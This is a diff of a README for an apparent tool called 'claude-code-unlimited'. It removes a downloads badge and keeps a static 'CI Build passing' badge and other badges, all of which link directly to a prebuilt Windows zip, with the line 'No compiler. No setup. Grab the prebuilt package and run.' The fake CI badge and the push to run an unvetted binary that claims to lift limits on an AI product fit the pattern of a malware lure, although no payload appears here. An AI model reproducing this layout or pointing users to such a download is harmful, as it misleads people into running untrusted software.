@@ -7,7 +7,6 @@
 [![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
 [![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
-[![Downloads](https://img.shields.io/github/downloads/SodovaFo7/claude-code-unlimited/total?style=for-the-badge&color=blueviolet)](../../releases)
 [![Stars](https://img.shields.io/github/stars/SodovaFo7/claude-code-unlimited?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)
 
 <p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>
